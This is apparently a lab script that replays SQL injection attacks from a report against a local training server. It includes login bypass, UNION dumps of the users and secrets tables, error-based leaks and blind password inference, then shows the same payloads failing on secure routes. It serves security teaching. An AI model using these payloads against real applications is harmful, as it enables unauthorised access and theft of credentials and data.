#!/usr/bin/env bash
# run-attacks.sh — reproduces every SQL injection attack in the report against
# the running lab server (node app.js, http://localhost:3001).
#
# Usage:  bash attacks/run-attacks.sh
set -u
B="http://localhost:3001"

hr() { printf '\n============================================================\n%s\n============================================================\n' "$1"; }

hr "ATTACK 1 — Authentication bypass (tautology)"
echo "[1a] honest wrong password (control) -> should fail:"
curl -s -X POST $B/login-vulnerable -H 'Content-Type: application/json' \
  -d '{"username":"admin","password":"wrong"}'; echo

echo "[1b] OR tautology with comment -> logs in as first user:"
curl -s -X POST $B/login-vulnerable -H 'Content-Type: application/json' \
  -d "{\"username\":\"' OR '1'='1' --\",\"password\":\"x\"}"; echo

echo "[1c] target admin directly, comment out the password check:"
curl -s -X POST $B/login-vulnerable -H 'Content-Type: application/json' \
  -d "{\"username\":\"admin' --\",\"password\":\"x\"}"; echo

hr "ATTACK 2 — UNION-based data extraction"
echo "[2a] dump users table (usernames + passwords):"
curl -s -G $B/products-vulnerable \
  --data-urlencode "category=' UNION SELECT id, username, password, role FROM users --"; echo

echo "[2b] dump secrets table (no route ever exposes it):"
curl -s -G $B/products-vulnerable \
  --data-urlencode "category=' UNION SELECT id, label, value, '0' FROM secrets --"; echo

hr "ATTACK 3 — Error-based information disclosure"
echo "[3a] unbalanced quote -> DB error text leaks to attacker:"
curl -s -G $B/products-vulnerable --data-urlencode "category='"; echo
echo "[3b] leak the database engine/version:"
curl -s -G $B/products-vulnerable \
  --data-urlencode "category=' UNION SELECT sqlite_version(), 2, 3, 4 --"; echo

hr "ATTACK 4 — Blind boolean-based inference"
echo "[4a] TRUE condition -> rows returned:"
curl -s -G $B/products-vulnerable --data-urlencode "category=electronics' AND '1'='1"; echo
echo "[4b] FALSE condition -> zero rows (the oracle):"
curl -s -G $B/products-vulnerable --data-urlencode "category=electronics' AND '1'='2"; echo
echo "[4c] does admin password start with 'S'? (TRUE):"
curl -s -G $B/products-vulnerable \
  --data-urlencode "category=electronics' AND (SELECT substr(password,1,1) FROM users WHERE username='admin')='S"; echo
echo "[4d] does it start with 'X'? (FALSE):"
curl -s -G $B/products-vulnerable \
  --data-urlencode "category=electronics' AND (SELECT substr(password,1,1) FROM users WHERE username='admin')='X"; echo

hr "SECURE ROUTES — the same payloads are now powerless"
echo "[S1] auth bypass vs /login-secure:"
curl -s -X POST $B/login-secure -H 'Content-Type: application/json' \
  -d "{\"username\":\"admin' --\",\"password\":\"x\"}"; echo
echo "[S2] UNION vs /products-secure:"
curl -s -G $B/products-secure \
  --data-urlencode "category=' UNION SELECT id, username, password, role FROM users --"; echo
echo "[S3] legitimate request still works vs /products-secure:"
curl -s "$B/products-secure?category=electronics"; echo
